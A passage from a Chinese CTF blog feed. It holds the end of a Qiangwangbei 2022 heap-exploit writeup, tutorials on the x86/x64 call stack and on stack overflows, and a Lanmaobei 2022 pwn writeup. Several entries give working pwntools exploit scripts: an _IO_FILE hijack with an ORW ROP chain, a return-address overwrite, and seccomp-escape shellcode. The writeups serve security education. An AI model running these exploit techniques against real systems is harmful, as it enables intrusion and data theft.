class="number">0x1350</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">0</span>)<span class="comment">#</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr + <span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=setcontext_rdx</span></span><br><span class="line">fake_IO_FILE += p64(setcontext)<span class="comment">#_IO_save_end=call addr(call setcontext)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr + <span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_wfile_jumps + <span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr + <span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">payload = fake_IO_FILE + p64(flag_addr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(rop_addr) + p64(ret)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x418</span>, payload) <span class="comment">#4 &amp;&amp; 2 uaf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#large bin attack stderr</span></span><br><span class="line">edit(<span class="number">0</span>, p64(libcbase + <span class="number">0x21a0d0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(stderr - <span class="number">0x20</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi) + p64(<span class="number">0</span>) + p64(close_addr)   <span class="comment">#close(0) fd-&gt;0</span></span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>) + p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(syscall) <span class="comment">#open(flag, 0)</span></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(heapbase) + p64(pop_rdx_r12) + p64(<span class="number">0x30</span>) * <span class="number">2</span> + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x440</span>, orw)</span><br><span class="line"></span><br><span class="line"><span class="comment">#large bin attack top chunk size</span></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x440</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x438</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x430</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x438</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x450</span>)</span><br><span class="line"><span class="comment">#edit(4, p64(libcbase + 0x21a0e0) * 2 + p64(0) + p64(heapbase + 0x3160 - 0x20))</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">4</span>, p64(libcbase + <span class="number">0x21a0e0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(heapbase + <span class="number">0x2d00</span> + <span class="number">3</span> - <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&quot;mew mew mew~~~~~~&quot;</span>, <span class="string">b&quot;CAT | r00t QWBQWXF $\xff\xff\xff\xff&quot;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(<span class="number">11</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;gdb.attach(io,&#x27;b* (_IO_wfile_seekoff)&#x27;)</span></span><br><span class="line"><span class="string">pause()&#x27;&#x27;&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x468</span>))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100922863.png"></p>
<p>成功打出flag</p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>强网杯2022</tag>
      </tags>
  </entry>
  <entry>
    <title>函数调用栈</title>
    <url>/2022/01/12/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>函数调用栈是一块用来保存函数运行状态的连续的内存区域。主调函数（caller）和被调函数（callee）根据调用关系堆叠起来，从内存的高地址向低地址增长。这个过程主要涉及eip、esp、和ebp三个寄存器：</p>
<p>eip用于储存即将执行的指令的地址；esp用于储存栈顶地址，随着数据的压栈和出栈而变化；ebp用于储存栈基址，并参与栈内数据的寻址。</p>
<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> arg1, <span class="type">int</span> arg2, <span class="type">int</span> arg3, <span class="type">int</span> arg4, <span class="type">int</span> arg5, <span class="type">int</span> arg6, <span class="type">int</span> arg7, <span class="type">int</span> arg8)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> loc1 = arg1 + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> loc8 = arg8 + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">return</span> loc1 + loc8;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> func(<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">77</span>, <span class="number">88</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分别用以下命令编译成32位和64位</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -m32 -o stack stack.c</span><br><span class="line">gcc -o stack64 stack.c</span><br></pre></td></tr></table></figure>

<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p><a href="https://imgtu.com/i/7Kf7NR"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100921172.png" alt="7Kf7NR.png"></a></p>
<p>总体入栈顺序为</p>
<p><a href="https://imgtu.com/i/7KhZDg"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100921113.png" alt="7KhZDg.png"></a></p>
<p>接下来看一下两个函数的汇编指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x080483fd &lt;+0&gt;:	push   ebp					# 栈底ebp压栈（esp -= 4）</span><br><span class="line">   0x080483fe &lt;+1&gt;:	mov    ebp,esp					# 将栈顶esp的值赋给ebp，此时ebp指向当前函数栈帧的起始地址</span><br><span class="line">   0x08048400 &lt;+3&gt;:	push   0x58					# 实参88入栈（esp -= 4）</span><br><span class="line">   0x08048402 &lt;+5&gt;:	push   0x4d					# 实参77入栈（esp -= 4）</span><br><span class="line">   0x08048404 &lt;+7&gt;:	push   0x42					# 实参66入栈（esp -= 4）</span><br><span class="line">   0x08048406 &lt;+9&gt;:	push   0x37					# 实参55入栈（esp -= 4）</span><br><span class="line">   0x08048408 &lt;+11&gt;:	push   0x2c					# 实参44入栈（esp -= 4）</span><br><span class="line">   0x0804840a &lt;+13&gt;:	push   0x21					# 实参33入栈（esp -= 4）</span><br><span class="line">   0x0804840c &lt;+15&gt;:	push   0x16					# 实参22入栈（esp -= 4）</span><br><span class="line">   0x0804840e &lt;+17&gt;:	push   0xb					# 实参11入栈（esp -= 4）</span><br><span class="line">   0x08048410 &lt;+19&gt;:	call   0x80483db &lt;func&gt;				# 调用func()函数(push  0x08048415)</span><br><span class="line">   0x08048415 &lt;+24&gt;:	add    esp,0x20					# 恢复栈顶指针esp</span><br><span class="line">   0x08048418 &lt;+27&gt;:	leave  						# mov esp ebp; pop ebp  </span><br><span class="line">   0x08048419 &lt;+28&gt;:	ret    						# 函数返回，将栈中的返回地址弹出到eip指针</span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; disassemble func</span><br><span class="line">Dump of assembler code for function func:</span><br><span class="line">   0x080483db &lt;+0&gt;:	push   ebp					# 栈底ebp压栈（esp -= 4）</span><br><span class="line">   0x080483dc &lt;+1&gt;:	mov    ebp,esp					# 将栈顶esp的值赋给ebp，此时ebp指向当前函数栈帧的起始地址</span><br><span class="line">   0x080483de &lt;+3&gt;:	sub    esp,0x10					# 为局部变量开辟栈空间</span><br><span class="line">   0x080483e1 &lt;+6&gt;:	mov    eax,DWORD PTR [ebp+0x8]  		# 取出arg1</span><br><span class="line">   0x080483e4 &lt;+9&gt;:	add    eax,0x1					# 计算loc1</span><br><span class="line">   0x080483e7 &lt;+12&gt;:	mov    DWORD PTR [ebp-0x8],eax			# 将计算之后的loc1入栈</span><br><span class="line">   0x080483ea &lt;+15&gt;:	mov    eax,DWORD PTR [ebp+0x24] 		# 取出arg8</span><br><span class="line">   0x080483ed &lt;+18&gt;:	add    eax,0x8					# 计算loc8</span><br><span class="line">   0x080483f0 &lt;+21&gt;:	mov    DWORD PTR [ebp-0x4],eax			# 将计算之后的loc8入栈</span><br><span class="line">   0x080483f3 &lt;+24&gt;:	mov    edx,DWORD PTR [ebp-0x8]			# 取出loc1</span><br><span class="line">   0x080483f6 &lt;+27&gt;:	mov    eax,DWORD PTR [ebp-0x4]  		# 取出loc8</span><br><span class="line">   0x080483f9 &lt;+30&gt;:	add    eax,edx					# 计算函数返回值</span><br><span class="line">   0x080483fb &lt;+32&gt;:	leave  						# mov esp ebp; pop ebp</span><br><span class="line">   0x080483fc &lt;+33&gt;:	ret 						# 函数返回</span><br></pre></td></tr></table></figure>

<p>首先主调函数将被调函数func()的八个参数入栈（arg8、arg7 ······arg2、arg1），然后执行call指令调用func()函数，当执行call指令时，下一条指令的地址作为函数的返回地址入栈。接下来程序进入到func()函数，先将主调函数的ebp入栈保存，然后更新ebp为func()函数的栈顶地址，作为func()函数的基址。接下来esp下移为局部变量开辟栈空间，然后局部变量入栈。当函数返回时，程序执行leave指令将刚进入func()函数时栈中保存的主调函数ebp赋给栈顶指针esp，然后将保存的主调函数ebp出栈，最后ret指令将保存在栈中的返回地址弹出给eip，程序跳转至该地址，一次完整的函数调用即完成了。</p>
<h2 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h2><p><a href="https://imgtu.com/i/7KhK5n"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100921647.png" alt="7KhK5n.png"></a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function main:</span><br><span class="line">   <span class="number">0x000000000040050a</span> &lt;+<span class="number">0</span>&gt;:	push   rbp				<span class="comment"># 将栈底rbp入栈，（rsp - = 8）</span></span><br><span class="line">   <span class="number">0x000000000040050b</span> &lt;+<span class="number">1</span>&gt;:	mov    rbp,rsp				<span class="comment"># 将栈顶rsp的值赋给rbp</span></span><br><span class="line">   <span class="number">0x000000000040050e</span> &lt;+<span class="number">4</span>&gt;:	push   <span class="number">0x58</span>				<span class="comment"># arg8入栈，（rsp - = 8）</span></span><br><span class="line">   <span class="number">0x0000000000400510</span> &lt;+<span class="number">6</span>&gt;:	push   <span class="number">0x4d</span>				<span class="comment"># arg7入栈，（rsp - = 8）</span></span><br><span class="line">   <span class="number">0x0000000000400512</span> &lt;+<span class="number">8</span>&gt;:	mov    r9d,<span class="number">0x42</span>				<span class="comment"># 将arg6的值赋给r9</span></span><br><span class="line">   <span class="number">0x0000000000400518</span> &lt;+<span class="number">14</span>&gt;:	mov    r8d,<span class="number">0x37</span>				<span class="comment"># 将arg5的值赋给r8</span></span><br><span class="line">   <span class="number">0x000000000040051e</span> &lt;+<span class="number">20</span>&gt;:	mov    ecx,<span class="number">0x2c</span>				<span class="comment"># 将arg4的值赋给ecx</span></span><br><span class="line">   <span class="number">0x0000000000400523</span> &lt;+<span class="number">25</span>&gt;:	mov    edx,<span class="number">0x21</span>				<span class="comment"># 将arg3的值赋给edx</span></span><br><span class="line">   <span class="number">0x0000000000400528</span> &lt;+<span class="number">30</span>&gt;:	mov    esi,<span class="number">0x16</span>				<span class="comment"># 将arg2的值赋给esi</span></span><br><span class="line">   <span class="number">0x000000000040052d</span> &lt;+<span class="number">35</span>&gt;:	mov    edi,<span class="number">0xb</span>				<span class="comment"># 将arg1的值赋给edi</span></span><br><span class="line">   <span class="number">0x0000000000400532</span> &lt;+<span class="number">40</span>&gt;:	call   <span class="number">0x4004d6</span> &lt;func&gt;			<span class="comment"># 调用func函数，push0x400537</span></span><br><span class="line">   <span class="number">0x0000000000400537</span> &lt;+<span class="number">45</span>&gt;:	add    rsp,<span class="number">0x10</span>							<span class="comment"># 恢复栈顶</span></span><br><span class="line">   <span class="number">0x000000000040053b</span> &lt;+<span class="number">49</span>&gt;:	leave  									<span class="comment"># mov esp ebp;pop ebp</span></span><br><span class="line">   <span class="number">0x000000000040053c</span> &lt;+<span class="number">50</span>&gt;:	ret    									<span class="comment"># 函数返回</span></span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; disassemble func</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function func:</span><br><span class="line">   <span class="number">0x00000000004004d6</span> &lt;+<span class="number">0</span>&gt;:		push   rbp			<span class="comment"># 将栈底rbp入栈，（rsp - = 8）</span></span><br><span class="line">   <span class="number">0x00000000004004d7</span> &lt;+<span class="number">1</span>&gt;:		mov    rbp,rsp			<span class="comment"># 将栈顶rsp的值赋给rbp</span></span><br><span class="line">   <span class="number">0x00000000004004da</span> &lt;+<span class="number">4</span>&gt;:		mov    DWORD PTR [rbp-<span class="number">0x14</span>],edi</span><br><span class="line">   <span class="number">0x00000000004004dd</span> &lt;+<span class="number">7</span>&gt;:		mov    DWORD PTR [rbp-<span class="number">0x18</span>],esi</span><br><span class="line">   <span class="number">0x00000000004004e0</span> &lt;+<span class="number">10</span>&gt;:	mov    DWORD PTR [rbp-<span class="number">0x1c</span>],edx</span><br><span class="line">   <span class="number">0x00000000004004e3</span> &lt;+<span class="number">13</span>&gt;:	mov    DWORD PTR [rbp-<span class="number">0x20</span>],ecx</span><br><span class="line">   <span class="number">0x00000000004004e6</span> &lt;+<span class="number">16</span>&gt;:	mov    DWORD PTR [rbp-<span class="number">0x24</span>],r8d</span><br><span class="line">   <span class="number">0x00000000004004ea</span> &lt;+<span class="number">20</span>&gt;:	mov    DWORD PTR [rbp-<span class="number">0x28</span>],r9d</span><br><span class="line">   <span class="number">0x00000000004004ee</span> &lt;+<span class="number">24</span>&gt;:	mov    eax,DWORD PTR [rbp-<span class="number">0x14</span>]</span><br><span class="line">   <span class="number">0x00000000004004f1</span> &lt;+<span class="number">27</span>&gt;:	add    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004004f4</span> &lt;+<span class="number">30</span>&gt;:	mov    DWORD PTR [rbp-<span class="number">0x8</span>],eax</span><br><span class="line">   <span class="number">0x00000000004004f7</span> &lt;+<span class="number">33</span>&gt;:	mov    eax,DWORD PTR [rbp+<span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x00000000004004fa</span> &lt;+<span class="number">36</span>&gt;:	add    eax,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x00000000004004fd</span> &lt;+<span class="number">39</span>&gt;:	mov    DWORD PTR [rbp-<span class="number">0x4</span>],eax</span><br><span class="line">   <span class="number">0x0000000000400500</span> &lt;+<span class="number">42</span>&gt;:	mov    edx,DWORD PTR [rbp-<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x0000000000400503</span> &lt;+<span class="number">45</span>&gt;:	mov    eax,DWORD PTR [rbp-<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0x0000000000400506</span> &lt;+<span class="number">48</span>&gt;:	add    eax,edx				<span class="comment"># 计算返回值</span></span><br><span class="line">   <span class="number">0x0000000000400508</span> &lt;+<span class="number">50</span>&gt;:	pop    rbp				<span class="comment"># 恢复rbp，（rsp + = 8）</span></span><br><span class="line">   <span class="number">0x0000000000400509</span> &lt;+<span class="number">51</span>&gt;:	ret    					<span class="comment"># 函数返回</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到，与x86不同的是，对于x86-64的程序，会先将函数前六个参数依次保存在rdi,rsi,rdx,rcx,r8和r9进行传递，多余的参数才会和x86那样入栈。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出原理</title>
    <url>/2022/01/13/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
<ul>
<li>程序必须向栈上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。</p>
<h1 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you hack it&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用以下命令编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -o stack_example stack_example.c </span><br></pre></td></tr></table></figure>

<p>-m32意思是编译为32位的程序</p>
<p>-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector</p>
<p><a href="https://imgtu.com/i/7MIatJ"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100923427.png" alt="7MIatJ.png"></a></p>
<p>可以看到gcc编译时对我们程序使用了gets函数发出了警告，gets()函数不会对字符串长度进行检测，而是以回车判断输入是否结束，所以gets()函数是很容易造成栈溢出的</p>
<p>用checksec检查程序的保护机制</p>
<p><a href="https://imgtu.com/i/7MIMfs"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100923142.png" alt="7MIMfs.png"></a></p>
<p>用32位IDA反编译该程序</p>
<p>查看vuln()函数</p>
<p><a href="https://imgtu.com/i/7MovIe"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100923727.png" alt="7MovIe.png"></a></p>
<p>可以发现s距离ebp的距离为0x6c</p>
<p>此时的栈结构为</p>
<p><a href="https://imgtu.com/i/7M4XVg"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100923245.png" alt="7M4XVg.png"></a></p>
<p>通过IDA得到success()函数的地址 0x804843B</p>
<p><a href="https://imgtu.com/i/7MofVU"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100923962.png" alt="7MofVU.png"></a></p>
<p>程序本身是没有调用success()函数的，但是可以通过gets()函数输入我们构造的payload覆盖函数的返回地址为success()函数的地址，所以我们的payload为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;a&#x27;*(0x6c+4) + success_addr</span><br></pre></td></tr></table></figure>

<p>向程序输入payload之后ebp会被覆盖成我们输入的垃圾数据，返回地址被覆盖成success()函数的地址，此时栈结构</p>
<p><a href="https://imgtu.com/i/7M5Uzt"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100923112.png" alt="7M5Uzt.png"></a></p>
<p>借助pwntools写脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./stack_example&quot;)</span><br><span class="line">success_addr = 0x804843B</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x6c+4) + p32(success_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>执行代码成功让程序执行success()函数</p>
<p><a href="https://imgtu.com/i/7MID6x"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100923289.png" alt="7MID6x.png"></a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过上面一个简单的例子总结出栈溢出的基本步骤</p>
<p>1.分析代码找到危险函数如gets()</p>
<p>2.确定需要填充垃圾数据的长度，这里主要是计算出输入的地址距离我们需要覆盖的地址的偏移(如例子中是s到函数返回地址的距离)</p>
<p>栈溢出漏洞一般有以下几种情况</p>
<ul>
<li>覆盖函数的返回地址</li>
<li>覆盖程序中某个变量的内容</li>
<li>覆盖bss段某个变量的内容</li>
</ul>
<p>3.构造payload并利用pwntools完成攻击脚本的编写</p>
<p>一些危险函数</p>
<ul>
<li>输入<ul>
<li>gets，直接读取一行，忽略’\x00’</li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>strcpy，字符串复制，遇到’\x00’停止</li>
<li>strcat，字符串拼接，遇到’\x00’停止</li>
<li>bcopy</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝帽杯2022pwn题</title>
    <url>/2022/07/18/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/</url>
    <content><![CDATA[<p>蓝帽杯2022 pwn题复现</p>
<span id="more"></span>

<h1 id="EscapeShellcode"><a href="#EscapeShellcode" class="headerlink" title="EscapeShellcode"></a>EscapeShellcode</h1><p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100924681.jpg"></p>
<p>只允许read和write</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100924330.jpg"></p>
<p>程序将根目录下的flag读入到bss段的flag变量中</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100924308.jpg"></p>
<p>这里输入shellcode并执行，执行之前会将除了rip之外的寄存器全部清除</p>
<p>程序开启了pie，这里采用泄露地址的方法拿到flag的地址，然后直接write出来</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100924754.jpg"></p>
<p>在fs + 0x300处有一个栈地址可以泄露</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;106.54.163.94&#x27;</span></span><br><span class="line">port = <span class="number">20000</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rsi,rsi;</span></span><br><span class="line"><span class="string">mov rsi, fs:[0x300];</span></span><br><span class="line"><span class="string">mov rsi, [rsi];</span></span><br><span class="line"><span class="string">add rsi, 0x2b90;</span></span><br><span class="line"><span class="string">xor rdi, rdi;</span></span><br><span class="line"><span class="string">xor rdx, rdx;</span></span><br><span class="line"><span class="string">mov rdi, 1;</span></span><br><span class="line"><span class="string">mov rdx, 0x30;</span></span><br><span class="line"><span class="string">mov rax, 1;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h1><p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100924554.jpg"></p>
<p>取钱的函数里存在逻辑漏洞，当取的钱和账户里剩余的钱相等时，不会扣钱，这里存钱和取钱结合就能刷很多钱了</p>
<p>向hacker转钱时可以free任意地址</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100924690.jpg"></p>
<p>向admin转钱可以泄露堆地址</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100924679.jpg"></p>
<p>这里的话需要利用relloc的特性</p>
<ol>
<li>对ptr进行判断，如果ptr为NULL，则函数相当于malloc(new_size),试着分配一块大小为new_size的内存，如果成功将地址返回，否则返回NULL。如果ptr不为NULL，则进入2</li>
<li>查看ptr是不是在堆中，如果不是的话会跑出异常错误，会发生realloc invalid pointer。如果ptr在堆中，则查看new_size大小，如果new_size大小为0，则相当于free(ptr)，将ptr指针释放，返回NULL，如果new_size小于原大小，则ptr中的数据可能会丢失，只有new_size大小的数据会保存（这里很重要），如果size等于原大小，等于啥都没做，如果size大于原大小，则看ptr所在的位置还有没有足够的连续内存空间，如果有的话，分配更多的空间，返回的地址和ptr相同，如果没有的话，则会使用malloc分配更大的内存，将旧的内容拷贝到新的内存中，把旧的内存free掉，则返回新地址，否则返回NULL。</li>
</ol>
<p>在realloc了一块空间后，再realloc一块更小的这样就能达到free的效果，从而泄露堆地址</p>
<p>因为可以free任意地址，所以可以直接伪造unsorted bin大小的chunk来达到泄露libc的效果</p>
